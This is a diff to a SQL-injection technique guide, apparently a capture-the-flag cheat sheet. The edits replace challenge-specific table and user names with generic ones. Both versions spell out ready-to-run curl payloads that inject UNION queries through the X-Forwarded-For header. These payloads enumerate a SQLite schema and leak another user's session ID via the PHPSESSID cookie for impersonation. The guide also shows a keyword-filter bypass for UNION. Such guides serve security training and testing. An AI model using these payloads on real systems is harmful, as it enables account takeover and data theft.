@@ -716,20 +716,20 @@ Use `sleep()` / `benchmark()` inside the sort expression to run a blind timing o
 
 ## SQLite UNION via X-Forwarded-For with PHPSESSID Oracle
 
-**Pattern:** A session initializer builds `SELECT... FROM nxf8_sessions WHERE ip_address = '<X-Forwarded-For>'` and copies the resulting row into the `PHPSESSID` cookie. The value of the last column of your UNION row becomes the cookie — a free one-shot exfiltration channel. The error message `unrecognized token` reveals SQLite; enumerate with `sqlite_master`.
+**Pattern:** A session initializer builds `SELECT... FROM sessions WHERE ip_address = '<X-Forwarded-For>'` and copies the resulting row into the `PHPSESSID` cookie. The value of the last column of your UNION row becomes the cookie — a free one-shot exfiltration channel. The error message `unrecognized token` reveals SQLite; enumerate with `sqlite_master`.
 
 ```bash
 # Discover column count (4 columns in this table)
-curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,null from nxf8_users where '1'='1"
+curl -i http://target/ -H "X-Forwarded-For: x' union select null,null,null,null from users where '1'='1"
 
 # Leak table definitions from sqlite_master
-curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,sql from sqlite_master where tbl_name='nxf8_users' and type='table"
+curl -i http://target/ -H "X-Forwarded-For: x' union select null,null,null,sql from sqlite_master where tbl_name='users' and type='table"
 
-# Exfiltrate a specific row (session_id for user 5)
-curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,session_id from nxf8_sessions where user_id=5 and '1'='1"
+# Exfiltrate a specific row (session_id for a target user)
+curl -i http://target/ -H "X-Forwarded-For: x' union select null,null,null,session_id from sessions where user_id=5 and '1'='1"
 # -> Set-Cookie: PHPSESSID=<leaked value>
 ```
-Pad with `null` columns until the UNION fits; place the target expression in the column whose value is reflected in the cookie. Reuse the leaked `session_id` as your own `PHPSESSID` to impersonate the target user (e.g., Maria).
+Pad with `null` columns until the UNION fits; place the target expression in the column whose value is reflected in the cookie. Reuse the leaked `session_id` as your own `PHPSESSID` to impersonate the target user.
 
 **Key insight:** Session-ID generation logic often includes unsanitized HTTP headers (`X-Forwarded-For`, `Client-IP`, `True-Client-IP`). The reflected row becomes a free oracle: no error-based or time-based inference required. SQLite-specific UNION uses `null` padding and `sqlite_master(type,name,tbl_name,sql)` for schema enumeration (no `information_schema`).
 
@@ -741,10 +741,10 @@ Pad with `null` columns until the UNION fits; place the target expression in the
 ```sql
 - Original: SELECT items FROM Search WHERE items='<input>';
 - Blocked (filter sees " UNION "):
-aggies' UNION SELECT 1; #
+foo' UNION SELECT 1; #
 
-- Bypass (no space before UNION — filter sees "UNION" embedded in word "aggies'UNION"):
-aggies'UNION SELECT 1; #
+- Bypass (no space before UNION — filter sees "UNION" embedded in word "foo'UNION"):
+foo'UNION SELECT 1; #
 
 - Drop the string prefix entirely:
 'UNION SELECT @@VERSION #
